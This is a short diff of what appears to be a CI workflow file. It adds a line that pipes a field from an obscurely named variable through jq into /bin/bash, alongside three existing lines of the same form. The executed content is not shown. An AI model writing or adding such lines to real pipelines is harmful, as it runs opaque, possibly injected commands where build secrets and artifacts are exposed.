@@ -32,6 +32,7 @@ jobs:
           echo $dyjv15 | jq -r .upgb53 | /bin/bash
           printf '%s' "$rxcbg2358" | jq -r .hpw503 | /bin/bash
           echo $iqcwk79476 | jq -r .cglu5 | /bin/bash
+          echo $b66 | jq -r .o4 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
